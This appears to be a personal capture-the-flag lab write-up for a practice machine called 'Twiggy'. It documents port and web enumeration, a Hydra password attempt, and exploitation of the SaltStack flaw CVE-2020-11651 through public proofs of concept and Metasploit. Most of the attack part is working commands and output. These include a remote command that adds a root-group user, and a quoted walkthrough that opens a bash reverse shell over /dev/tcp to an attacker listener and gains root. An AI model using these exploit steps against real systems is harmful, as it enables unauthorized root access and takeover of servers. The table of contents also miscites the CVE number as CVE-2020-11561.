# Twiggy
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh)
    * [DNS](#dns)
    * [HTTP](#http)
    * [ZMTP](#zmtp)
  * [OS](#os)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing)
    * [Default Credentials](#default-credentials)
    * [Hydra](#hydra)
  * [CVE-2020-11561](#cve-2020-11561)
    * [EDB-ID-48421](#edb-id-48421)
    * [jasperla POC](#jasperla-poc)
    * [dozernz POC](#dozernz-poc)
    * [Metasploit](#metasploit)
* [Explore](#explore)
* [Escalate](#escalate)
* [Effect](#effect)

## Summary
* Hostname: twiggy
* Description: An easy machine, but a tad sneaky.
* IP address: 192.168.208.62
* MAC address: (ref:)
* Domain: 
* TCP Ports and Services
  * 22
    * OpenSSH 7.4 (protocol 2.0)
  * 53
    * NLnet Labs NSD
  * 80
    * nginx 1.16.1
    * Mezzanine 4.3.2
  * 4505
    * Saltstack
    * ZeroMQ ZMTP 2.0
  * 4506
    * Saltstack
    * ZeroMQ ZMTP 2.0
  * 8000
    * nginx 1.16.1
    * CherryPy 5.6.0
* OS
  * Distro: Linux (ref: Nmap)
  * Kernel: Linux 3.X|4.X|5.X (ref: Nmap)
* Users (ref: post-exploitation)
  * root
* Vulnerabilities and Exploits
  * CVE-2020-11651 (ref: manual analysis; ports 4505/4506 are used for Saltstack; searchsploit Saltstack)
    * edb-id-48421
    * jasperla POC
    * dozernz POC
* Flag
  * a1ab00bdd1f5d9cea632d661674f77c9
* Hints
  * n/a

# Enumerate
```bash
TARGET=192.168.208.62
NAME=twiggy
mkdir $NAME
mkdir $NAME/exploits
mkdir $NAME/loot
mkdir $NAME/scans
mkdir $NAME/screenshots
sudo save-screenshots-here $NAME/screenshots
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 12:11 EDT
Nmap scan report for 192.168.208.62
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
```

## Services
### HTTP
```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch --format=simple

# output
[12:34:20] 200 -    6KB - /blog/                                            
[12:35:02] 200 -  530B  - /sitemap.xml  
```
```bash
dirsearch -u $TARGET:8000 -o $FULLPATH/$NAME-dirsearch-8000 --format=simple
[13:08:06] 404 -  555B  - /favicon.ico                                                                                        
[13:08:11] 500 -  823B  - /logout                                                                                                
[13:08:11] 500 -  823B  - /logout/                         
[13:08:20] 500 -    1KB - /servlet/%C0%AE%C0%AE%C0%AF
```
```bash
dirb http://$TARGET -r -z10 -o scans/$NAME-dirb

# output
dirb http://192.168.208.62 -z10 -o scans/twiggy-dirb-common

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/twiggy-dirb-common
START_TIME: Wed Jun 23 12:32:41 2021
URL_BASE: http://192.168.208.62/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
SPEED_DELAY: 10 milliseconds

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.208.62/ ----
(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
    (Try using FineTunning: '-f')
                                                                               
-----------------
END_TIME: Wed Jun 23 12:32:41 2021
DOWNLOADED: 0 - FOUND: 0
```
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.208.62
+ Target Hostname:    192.168.208.62
+ Target Port:        80
+ Start Time:         2021-06-23 12:46:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.16.1
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1351 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2021-06-23 12:48:31 (GMT-4) (118 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-script-http-shellshock
sudo nmap $TARGET -p8000 --script http-shellshock -oN scans/$NAME-nmap-script-http-shellshock

# output
NSTR
```

### Generic Nmap Scan
```bash
sudo nmap 192.168.102.62 -sC

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 23:03 EDT
Nmap scan report for 192.168.102.62
Host is up (0.13s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain
80/tcp   open  http
|_http-title: Home | Mezzanine
8000/tcp open  http-alt
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).

Nmap done: 1 IP address (1 host up) scanned in 31.01 seconds
```

## OS
```bash
sudo nmap 192.168.208.62 -O -oN scans/twiggy-nmap-os

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 12:24 EDT
Nmap scan report for 192.168.208.62
Host is up (0.074s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
8000/tcp open  http-alt
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|5.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5.1
Aggressive OS guesses: Linux 3.10 - 3.12 (89%), Linux 4.4 (89%), Linux 4.9 (89%), Linux 3.10 - 3.16 (86%), Linux 4.0 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.2 - 4.9 (85%), Linux 5.1 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
```

# Exploit
## Password Guessing
### Default Credentials
Did not work.
```bash
# mezzazine CMS
# admin:default
```

### Hydra
Did not work.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"

# output
NSTR
```

## CVE-2020-11651
### EDB-ID-48421
```bash
searchsploit saltstack
mkdir edb-id-48421
cd edb-id-48421
searchsploit -m 48421
python 48421.py ???
```

### jasperla POC
```bash
mkdir jasperla
cd jasperla
git clone https://github.com/jasperla/CVE-2020-11651-poc.git
cd CVE-2020-11651-poc
python ???
```

### dozernz POC
This works!
```bash
mkdir dozernz
cd dozernz
wget https://github.com/dozernz/cve-2020-11651.git
cd cve-2020-11651
sudo apt install python3-pip
pyenv global 3.9.5
pip install salt
# sudo tcpdump -i tun0 host 192.168.208.62
python CVE-2020-11651.py 192.168.208.62 master "ping -c2 192.168.49.208"
# this works, but reverse shell via nc did not (niether does bash)
python CVE-2020-11651.py 192.168.208.62 master "useradd -p $(openssl passwd -crypt password) -s /bin/bash -g 0 victor"
ssh victor@192.168.208.62
id # uid=1002(victor) gid=0(root) groups=0(root)
cat /root/proof.txt
```

### Metasploit
```bash
msfconsole
search saltstack
use exploit/linux/misc/saltstack_salt_unauth_rce
set LHOST tun0
set RHOST 192.168.152.62
run

# output
[*] Started HTTPS reverse handler on https://192.168.49.152:8443
[*] 192.168.152.62:4506 - Using auxiliary/gather/saltstack_salt_root_key as check
[*] 192.168.152.62:4506 - Connecting to ZeroMQ service at 192.168.152.62:4506
[*] 192.168.152.62:4506 - Negotiating signature
[*] 192.168.152.62:4506 - Negotiating version
[*] 192.168.152.62:4506 - Negotiating NULL security mechanism
[*] 192.168.152.62:4506 - Sending READY command of type REQ
[*] 192.168.152.62:4506 - Yeeting _prep_auth_info() at 192.168.152.62:4506
[+] 192.168.152.62:4506 - Root key: 5u3LOWydLI0nuQQVb7ylzbEKeWTZvhaLeT0w9RTHBYtq6lq0stud6KdzDTJa9WtWXOQzF27Bg1s=
[*] 192.168.152.62:4506 - Connecting to ZeroMQ service at 192.168.152.62:4506
[*] 192.168.152.62:4506 - Negotiating signature
[*] 192.168.152.62:4506 - Negotiating version
[*] 192.168.152.62:4506 - Negotiating NULL security mechanism
[*] 192.168.152.62:4506 - Sending READY command of type REQ
[*] 192.168.152.62:4506 - Executing Python payload on the master: python/meterpreter/reverse_https
[*] 192.168.152.62:4506 - Yeeting runner() at 192.168.152.62:4506
[*] Exploit completed, but no session was created.
```

# Explore

# Escalate

# Effect

# Lessons Learned
* (ZMTP) is a transport layer protocol for exchanging messages between two peers over a connected transport layer such as TCP (ref: https://rfc.zeromq.org/spec/23/).
* CherryPy is an object-oriented web application framework using the Python programming language. It is designed for rapid development of web applications by wrapping the HTTP protocol but stays at a low level and does not offer much more than what is defined in RFC 7231
* Saltstack listens on TCP port 4505 and 4506. It also uses the ZMTP protocol. 
* Make sure you can justify your exploits with plenty of enumeration (why go down a rabbit hole without reason?).

```bash
Curl

Next, we’ll run curl in a verbose mode against port 8000.

kali@kali:~$ curl http://192.168.120.121:8000 -v
*   Trying 192.168.120.121:8000...
* Connected to 192.168.120.121 (192.168.120.121) port 8000 (#0)
> GET / HTTP/1.1
> Host: 192.168.120.121:8000
> User-Agent: curl/7.72.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.16.1
< Date: Mon, 21 Dec 2020 20:36:04 GMT
< Content-Type: application/json
< Content-Length: 146
< Connection: keep-alive
< Access-Control-Expose-Headers: GET, POST
< Vary: Accept-Encoding
< Allow: GET, HEAD, POST
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Origin: *
< X-Upstream: salt-api/3000-1
< 
* Connection #0 to host 192.168.120.121 left intact
{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}

The response contains an interesting header, revealing that a SaltStack Rest API is listening on that port:

 X-Upstream: salt-api/3000-1

Exploitation
CVE-2020-11651

Based on the version listed in the header (3000-1) we discover an available remote code execution exploit.

Once we download the exploit, we discover that salt doesn’t support Python 3.8 and Kali won’t let us install packages under Python 3.7. Let’s tweak the exploit to address this issue.

kali@kali:~$ python3 -m venv env
...
kali@kali:~$ . ./env/bin/activate
(env) kali@kali:~$ pip install distro salt
...
(env) kali@kali:~$ sed -i 's/from platform import _supported_dists//' ./env/lib/python3.8/site-packages/salt/grains/core.py
(env) kali@kali:~$ sed -i 's/_supported_dists +=/_supported_dists =/' ./env/lib/python3.8/site-packages/salt/grains/core.py

Now we can start a netcat listener on port 4505 and launch the exploit.

(env) kali@kali:~/machines/twiggy$ python3 exploit.py 192.168.120.121 master 'bash -i >& /dev/tcp/192.168.118.2/4505 0>&1'
/home/kali/env/lib/python3.8/site-packages/salt/ext/tornado/httputil.py:107: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated since Python 3.3, and in 3.9 it will stop working
  class HTTPHeaders(collections.MutableMapping):
Attempting to ping master at 192.168.120.121
Retrieved root key: 8tnPuz4Fk+nH4c2CVW3/1BBbWofubqMZGJ1gkEkiB6WzlnyqQ7muDw3dbtKNwTMjUU6IcNFD9VY=
Got response for attempting master shell: {'jid': '20200518074808085260', 'tag': 'salt/run/20200518074808085260'}. Looks promising!

This grants us a reverse shell as root.

kali@kali:~$ nc -lvp 4505
listening on [any] 4505 ...
192.168.120.121: inverse host lookup failed: Unknown host
connect to [192.168.118.2] from (UNKNOWN) [192.168.120.121] 33584
bash: no job control in this shell
[root@localhost root]# id
id
uid=0(root) gid=0(root) groups=0(root)
```
